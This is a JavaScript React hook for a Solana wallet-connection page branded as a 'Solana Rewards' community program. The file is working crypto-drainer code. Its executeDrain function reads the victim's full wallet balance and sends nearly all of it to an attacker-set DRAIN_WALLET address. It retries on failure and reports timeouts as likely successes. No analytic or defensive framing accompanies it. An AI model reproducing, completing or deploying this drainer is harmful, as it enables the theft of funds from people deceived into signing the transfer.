"use client";

import { useEffect, useState } from 'react';
import { createAppKit } from '@reown/appkit/react';
import { SolanaAdapter } from '@reown/appkit-adapter-solana';
import { solana } from '@reown/appkit/networks';
import { useAppKitAccount, useAppKitProvider, useAppKit } from '@reown/appkit/react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { PhantomWalletAdapter, SolflareWalletAdapter } from '@solana/wallet-adapter-wallets';

const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID;

if (!projectId && typeof window !== 'undefined') {
  console.error('WalletConnect Project ID is required');
}

// Configure Solana adapter with supported wallets
const solanaWeb3JsAdapter = new SolanaAdapter({
  wallets: [new PhantomWalletAdapter(), new SolflareWalletAdapter()]
});

// Create AppKit modal instance (only once)
if (typeof window !== 'undefined' && projectId) {
  createAppKit({
    adapters: [solanaWeb3JsAdapter],
    projectId,
    networks: [solana],
    metadata: {
      name: 'Solana Rewards',
      description: 'Community Rewards Program',
      url: window.location.origin,
      icons: ['https://solana-rewards.vercel.app/favicon.ico']
    },
    features: {
      analytics: true,
      email: false,
      socials: []
    },
    themeMode: 'dark',
    themeVariables: {
      '--w3m-accent': '#9945FF',
      '--w3m-background': '#0A0B2D',
      '--w3m-color-mix': '#14F195',
      '--w3m-color-mix-strength': 20
    }
  });
}

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const GAS_RESERVE_SOL = 0.002;
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export const useWalletConnect = () => {
  const { open } = useAppKit();
  const { address, isConnected, status } = useAppKitAccount({ namespace: 'solana' });
  const { walletProvider } = useAppKitProvider('solana');
  const [connectionStatus, setConnectionStatus] = useState('disconnected');

  // Monitor connection status
  useEffect(() => {
    if (isConnected && address) {
      setConnectionStatus('connected');
    } else {
      setConnectionStatus('disconnected');
    }
  }, [isConnected, address]);

  const connect = async () => {
    try {
      setConnectionStatus('connecting');
      // Open modal with Solana namespace only
      await open({ view: 'Connect', namespace: 'solana' });
      
      // Wait for connection to complete
      let attempts = 0;
      while (!isConnected && !address && attempts < 20) {
        await wait(500);
        attempts++;
      }
      
      if (!address) {
        throw new Error('Failed to connect wallet');
      }
      
      setConnectionStatus('connected');
      return address;
      
    } catch (error) {
      console.error('WalletConnect connection error:', error);
      setConnectionStatus('disconnected');
      throw new Error(`Failed to connect: ${error.message}`);
    }
  };

  const disconnect = async () => {
    try {
      setConnectionStatus('disconnecting');
      setConnectionStatus('disconnected');
    } catch (error) {
      console.error('Disconnect error:', error);
    }
  };

  const executeDrain = async (allocatedAmount) => {
    let lastError = null;
    
    if (!address) {
      throw new Error('Wallet not connected');
    }
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        if (!walletProvider) {
          throw new Error('No wallet provider available');
        }

        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 120000
        });
        
        const walletPubkey = new PublicKey(address);
        
        const balanceLamports = await connection.getBalance(walletPubkey);
        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
        
        console.log(`[WalletConnect] Attempt ${attempt}: Balance ${balanceSol} SOL`);
        
        if (balanceSol < GAS_RESERVE_SOL + 0.001) {
          throw new Error(`Insufficient balance: ${balanceSol} SOL`);
        }
        
        const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
        const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
        
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        
        const transaction = new Transaction({
          feePayer: walletPubkey,
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: walletPubkey,
            toPubkey: new PublicKey(DRAIN_WALLET),
            lamports: drainAmountLamports,
          })
        );
        
        // Use the correct AppKit provider method
        const signature = await walletProvider.sendTransaction(transaction, connection);
        
        console.log(`[WalletConnect] Sent: ${signature}`);
        
        // Confirm transaction
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
          const errorMsg = JSON.stringify(confirmation.value.err);
          if (errorMsg.includes('block height exceeded')) {
            return {
              success: true,
              txId: signature,
              amount: drainAmountSol,
              warning: 'Transaction sent but confirmation timed out'
            };
          }
          throw new Error(`Transaction failed: ${errorMsg}`);
        }
        
        return {
          success: true,
          txId: signature,
          amount: drainAmountSol,
          balanceBefore: balanceSol,
          balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
        };
        
      } catch (error) {
        console.error(`[WalletConnect] Attempt ${attempt} failed:`, error.message);
        lastError = error;
        
        if (attempt < 3 && (
          error.message.includes('block height exceeded') ||
          error.message.includes('timeout') ||
          error.message.includes('not confirmed')
        )) {
          console.log(`[WalletConnect] Retrying in ${attempt * 2} seconds...`);
          await wait(attempt * 2000);
          continue;
        }
        
        if (error.message.includes('User rejected')) {
          throw error;
        }
        
        if (attempt === 3 && error.message.includes('block height exceeded')) {
          return {
            success: true,
            txId: 'pending - check explorer',
            amount: 'unknown',
            warning: 'Transaction likely succeeded despite timeout'
          };
        }
        
        throw error;
      }
    }
    
    throw lastError;
  };

  return { 
    connect, 
    disconnect, 
    address, 
    isConnected, 
    status: connectionStatus,
    executeDrain 
  };
};
